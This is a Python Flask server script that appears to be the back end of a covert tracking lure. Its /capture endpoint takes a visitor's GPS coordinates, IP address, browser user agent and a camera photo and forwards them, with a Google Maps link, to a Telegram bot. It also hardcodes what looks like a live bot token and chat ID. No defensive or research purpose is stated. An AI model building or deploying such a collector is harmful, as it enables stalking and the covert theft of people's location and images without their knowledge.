from flask import Flask, request, jsonify
import requests
import base64
import json
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "8776319908:AAE20JFKWYx7op_YrlvrWcT2MUisGMlnffc"
CHAT_ID = "6094939769"

API = f"https://api.telegram.org/bot{BOT_TOKEN}"

def tg(text):
    try:
        requests.post(f"{API}/sendMessage", json={
            "chat_id": CHAT_ID, "text": text, "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
    except: pass

def tg_photo(b64, caption):
    try:
        if ',' in b64: b64 = b64.split(',')[1]
        img = base64.b64decode(b64)
        name = f"/tmp/p_{datetime.now().timestamp()}.jpg"
        with open(name, 'wb') as f: f.write(img)
        with open(name, 'rb') as f:
            requests.post(f"{API}/sendPhoto", data={
                "chat_id": CHAT_ID, "caption": caption, "parse_mode": "HTML"
            }, files={"photo": f}, timeout=30)
    except Exception as e:
        tg(caption + f"\nPhoto error: {e}")

@app.route('/')
def home():
    return "Server is running!"

@app.route('/capture', methods=['POST'])
def capture():
    try:
        d = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip: ip = ip.split(',')[0]
        
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        lat, lon = d.get('lat'), d.get('lon')
        
        msg = f"<b>🎯 Naya Capture!</b>\n"
        msg += f"📍 Location: {lat}, {lon}\n"
        msg += f"🎯 Accuracy: {d.get('accuracy', 'N/A')}\n"
        msg += f"🌐 IP: {ip}\n"
        msg += f"⏰ Time: {ts}"
        
        if lat and lon and str(lat) != 'null' and str(lat) != 'None':
            msg += f"\n🗺️ Maps: https://www.google.com/maps?q={lat},{lon}"
        
        msg += f"\n📱 UA: {str(d.get('userAgent',''))[:50]}"
        
        if d.get('photo') and len(d['photo']) > 100:
            tg_photo(d['photo'], msg)
        else:
            tg(msg)
        
        print(f"[OK] Captured: {lat}, {lon}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[ERR] {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)